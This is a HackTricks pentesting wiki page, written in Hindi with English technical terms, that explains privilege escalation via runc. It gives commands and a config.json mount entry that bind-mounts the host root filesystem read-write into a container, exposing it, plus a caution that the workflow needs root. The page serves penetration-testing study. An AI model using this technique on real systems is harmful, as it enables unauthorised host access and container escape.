# RunC Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## मूल जानकारी

यदि आप **runc** के बारे में अधिक जानना चाहते हैं, तो निम्नलिखित page देखें:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

यदि host पर किसी rootful process के लिए `runc` उपलब्ध है, तो आप ऐसे OCI bundle का उपयोग कर सकते हैं जिसकी mount configuration host के `/` को container के अंदर `/` पर recursively bind-mount करती है, जिससे उस mount namespace में host filesystem exposed हो जाता है।<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> दस्तावेज़ीकृत `runc run` workflow rootful है: runc के अपने उदाहरण इसे "run as root" कहते हैं। किसी unprivileged user को `runc spec --rootless` जैसे rootless configuration की आवश्यकता होती है, और runc के documentation में बताया गया है कि इस mode के लिए user namespaces enabled होने चाहिए।<sup>[[1]](#references)</sup>

## References

- [1] [runc: containers को spawn और run करने के लिए CLI tool](https://github.com/opencontainers/runc#using-runc)
- [2] [OCI Runtime Specification: Mounts](https://github.com/opencontainers/runtime-spec/blob/main/config.md#mounts)
- [3] [Shared Subtrees](https://docs.kernel.org/filesystems/sharedsubtree.html)
{{#include ../../banners/hacktricks-training.md}}
